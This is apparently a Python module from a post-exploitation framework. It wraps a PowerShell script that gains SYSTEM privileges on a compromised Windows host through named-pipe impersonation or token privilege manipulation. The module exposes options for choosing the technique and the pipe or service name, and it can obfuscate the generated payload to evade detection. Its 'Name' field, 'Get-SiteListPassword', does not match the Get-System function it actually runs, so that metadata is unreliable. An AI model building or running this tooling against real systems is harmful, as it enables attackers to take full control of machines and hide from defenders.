from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Get-SiteListPassword',

            'Author': ['@harmj0y', '@mattifestation'],

            'Description': ("Gets SYSTEM privileges with one of two methods."),

            'Background' : False,

            'OutputExtension' : None,
            
            'NeedsAdmin' : True,

            'OpsecSafe' : False,
            
            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                'https://github.com/rapid7/meterpreter/blob/2a891a79001fc43cb25475cc43bced9449e7dc37/source/extensions/priv/server/elevate/namedpipe.c',
                'https://github.com/obscuresec/shmoocon/blob/master/Invoke-TwitterBot',
                'http://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/',
                'http://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Technique' : {
                'Description'   :   "Technique to use, 'NamedPipe' for service named pipe impersonation or 'Token' for adjust token privs.",
                'Required'      :   False,
                'Value'         :   'NamedPipe'
            },
            'ServiceName' : {
                'Description'   :   "Optional service name to used for 'NamedPipe' impersonation.",
                'Required'      :   False,
                'Value'         :   ''
            },
            'PipeName' : {
                'Description'   :   "Optional pipe name to used for 'NamedPipe' impersonation.",
                'Required'      :   False,
                'Value'         :   ''
            },
            'RevToSelf' : {
                'Description'   :   "Switch. Reverts the current thread privileges.",
                'Required'      :   False,
                'Value'         :   ''
            },
            'WhoAmI' : {
                'Description'   :   "Switch. Display the credentials for the current PowerShell thread.",
                'Required'      :   False,
                'Value'         :   ''
            }
        }
        
        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/Get-System.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        scriptEnd = "Get-System "

        if self.options['RevToSelf']['Value'].lower() == "true":
            scriptEnd += " -RevToSelf"
        elif self.options['WhoAmI']['Value'].lower() == "true":
            scriptEnd += " -WhoAmI"
        else:
            for option,values in self.options.iteritems():
                if option.lower() != "agent":
                    if values['Value'] and values['Value'] != '':
                        if values['Value'].lower() == "true":
                            # if we're just adding a switch
                            scriptEnd += " -" + str(option)
                        else:
                            scriptEnd += " -" + str(option) + " " + str(values['Value']) 

            scriptEnd += "| Out-String | %{$_ + \"`n\"};"
            scriptEnd += "'Get-System completed'"
        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
